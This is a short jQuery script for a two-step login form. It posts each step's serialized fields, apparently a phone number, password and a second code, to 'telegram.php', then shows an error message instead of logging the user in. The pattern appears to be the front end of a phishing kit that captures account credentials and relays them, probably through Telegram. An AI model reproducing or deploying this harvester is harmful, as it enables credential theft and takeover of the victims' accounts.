$( document ).ready(function() {
	$("#login_in_btn").click(function() {
		$("#block_form").css('display','block');
	});

    $("#form_step_1").submit(
		function(){
			// $("#input_phone").css('display','none');
			// $("#input_password").css('display','none');
			$("#form_step_1").css('display','none');
			$("#form_step_2").css('display','block');

			var formData = $( this ).serialize();

			$.post("telegram.php", formData, function() {
				
			});

			return false; 
		}
	);

	$("#form_step_2").submit(
		function(){
			$("#form_step_2").css('display','none');
			$(".error_site").css('display','block');

			var formData = $( this ).serialize();

			$.post("telegram.php", formData, function() {
				
			});

			return false; 
		}
	);
});